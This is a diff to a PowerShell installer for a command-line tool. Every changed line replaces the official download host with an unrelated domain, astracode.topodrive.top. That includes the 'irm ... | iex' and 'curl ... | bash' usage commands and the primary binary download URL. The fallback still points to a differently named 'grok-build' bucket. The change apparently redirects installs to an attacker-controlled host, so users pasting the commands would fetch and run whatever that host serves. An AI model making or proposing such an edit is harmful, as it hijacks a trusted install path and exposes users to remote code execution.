@@ -1,14 +1,14 @@
 #
-# Astra CLI installer for PowerShell — https://x.ai/cli/install.ps1
+# Astra CLI installer for PowerShell — https://astracode.topodrive.top/cli/install.ps1
 #
 # Auth: ASTRA_DEPLOYMENT_KEY env var (takes precedence) or ~/.astra/auth.json from `astra login`.
 # Env: ASTRA_CHANNEL (stable|alpha|enterprise, default: stable), ASTRA_BIN_DIR, ASTRA_PROXY_URL
 #
 # Usage:
-#   irm https://x.ai/cli/install.ps1 | iex                                       # latest stable
-#   & ([scriptblock]::Create((irm https://x.ai/cli/install.ps1))) -Version 0.1.42 # specific version
-#   $env:ASTRA_VERSION="0.1.42"; irm https://x.ai/cli/install.ps1 | iex           # specific version (alt)
-#   $env:ASTRA_DEPLOYMENT_KEY="<key>"; irm https://x.ai/cli/install.ps1 | iex
+#   irm https://astracode.topodrive.top/cli/install.ps1 | iex                                       # latest stable
+#   & ([scriptblock]::Create((irm https://astracode.topodrive.top/cli/install.ps1))) -Version 0.1.42 # specific version
+#   $env:ASTRA_VERSION="0.1.42"; irm https://astracode.topodrive.top/cli/install.ps1 | iex           # specific version (alt)
+#   $env:ASTRA_DEPLOYMENT_KEY="<key>"; irm https://astracode.topodrive.top/cli/install.ps1 | iex
 #
 
 param(
@@ -31,7 +31,7 @@ if (-not $Version) {
 
 # This script is Windows-only. PS 5.1 has no Platform property and only runs on Windows.
 if ($PSVersionTable.Platform -and $PSVersionTable.Platform -ne 'Win32NT') {
-    Write-Error "This installer is for Windows. On macOS/Linux, use: curl -fsSL https://x.ai/cli/install.sh | bash"
+    Write-Error "This installer is for Windows. On macOS/Linux, use: curl -fsSL https://astracode.topodrive.top/cli/install.sh | bash"
     exit 1
 }
 
@@ -148,7 +148,7 @@ $platform = "windows-$arch"
 
 # --- Resolve version and channel ---
 
-$BaseUrlPrimary = 'https://x.ai/cli'
+$BaseUrlPrimary = 'https://astracode.topodrive.top/cli'
 $BaseUrlFallback = 'https://storage.googleapis.com/grok-build-public-artifacts/cli'
 $DownloadDir = Join-Path $AstraDir 'downloads'
 $BinDir = if ($env:ASTRA_BIN_DIR) { $env:ASTRA_BIN_DIR } else { Join-Path $AstraDir 'bin' }
